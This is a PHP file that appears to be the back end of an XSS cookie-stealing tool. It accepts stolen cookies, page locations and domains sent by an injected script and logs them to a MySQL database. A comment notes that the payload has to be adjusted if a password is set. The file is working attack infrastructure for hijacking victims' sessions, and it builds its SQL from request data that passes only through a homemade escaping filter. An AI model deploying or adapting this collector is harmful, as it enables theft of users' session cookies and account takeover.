<?php
function filter($str) {
	// 转义为HTML Entity。安全性还行吧？
	$str = trim ( htmlspecialchars ( $str, ENT_QUOTES ) );
	$str = str_replace ( '\\', '&#92;', $str );
	$str = str_replace ( '/', '&#47;', $str );
	return $str;
}

require_once ('config.php');
//注：如果设置了密码，请修改相应payload。
if ($write_pwd != '' && $_REQUEST ['pwd'] != $write_pwd) {
	die ( 'Who are you? Password requierd.' );
}
require_once ('db.php');


if (isset ( $_REQUEST ['domain'] ) &&
		isset ( $_REQUEST ['location'] ) &&
		isset ( $_REQUEST ['cookie'] ) &&
		isset( $_REQUEST ['location'] ) != '' &&
		isset ( $_REQUEST ['toplocation'] ) != '' &&
		isset ( $_REQUEST ['opener'] ) != '' &&
		trim ( $_REQUEST ['domain'] ) != '') {
	date_default_timezone_set ( 'Asia/Shanghai' );
	$time = date ( 'Y-m-d H:i:s' );
	
	$domain = filter ( $_REQUEST ['domain'] );
	$location = filter ( urldecode ( $_REQUEST ['location'] ) );
	$toplocation = filter ( urldecode ( $_REQUEST ['toplocation'] ) );
	$cookie = filter ( $_REQUEST ['cookie'] );
	$opener = filter($_REQUEST['opener']);
	
	
	$sql = "insert into info (`time`,`domain`,`location`,`toplocation`,`cookie`,`opener`)
			values ('$time','$domain','$location','$toplocation','$cookie','$opener')";
	//echo($sql);
	$result = mysql_query ( $sql );
	
	/* if($result === false){
	 echo mysql_error();
	 }*/
	
	mysql_close ( $conn );
}
?>